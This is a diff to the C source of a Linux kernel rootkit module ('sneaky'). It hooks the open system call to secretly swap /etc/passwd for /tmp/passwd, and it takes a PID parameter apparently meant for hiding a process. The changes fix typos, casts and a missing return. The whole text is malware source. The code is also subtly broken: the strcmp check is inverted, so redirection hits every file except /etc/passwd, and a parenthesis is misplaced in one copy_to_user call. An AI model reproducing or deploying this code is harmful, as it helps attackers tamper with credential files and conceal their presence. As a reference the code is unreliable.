@@ -19,12 +19,6 @@
 #define REAL_PWD "/etc/passwd"
 #define FAKE_PWD "/tmp/passwd"
 
-#define handle_error(msg)                                                      \
-  do {                                                                         \
-    perror(msg);                                                               \
-    exit(EXIT_FAILURE);                                                        \
-  } while (0)
-
 struct linux_dirent {
   unsigned long d_ino;
   unsigned long d_off;
@@ -32,7 +26,7 @@ struct linux_dirent {
   char d_name[1];
 };
 
-static char *sneady_pid = "00000000";
+static char *sneaky_pid = "00000000";
 module_param(sneaky_pid, charp,
              S_IWUSR | S_IRUSR | S_IXUSR | S_IRGRP | S_IROTH);
 
@@ -57,15 +51,16 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
          "This guy wants to open /etc/passwd,redirect to /tmp.passwd now...\n");
 
   if (strcmp(pathname, REAL_PWD)) {
-    if (copy_to_user(pathname, FAKE_PWD, sizeof(FAKE_PWD)) != 0) {
+    if (copy_to_user((void *)pathname, FAKE_PWD, sizeof(FAKE_PWD)) != 0) {
       printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user1 \n");
       return -1;
     }
     int ori_value = original_open(pathname, flags);
-    if (copy_to_user(pathname, REAL_PWD, sizeof(REAL_PWD) != 0)) {
+    if (copy_to_user((void *)pathname, REAL_PWD, sizeof(REAL_PWD) != 0)) {
       printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user2 \n");
       return -1;
     }
+    return ori_value;
   } else {
     return original_open(pathname, flags);
   }
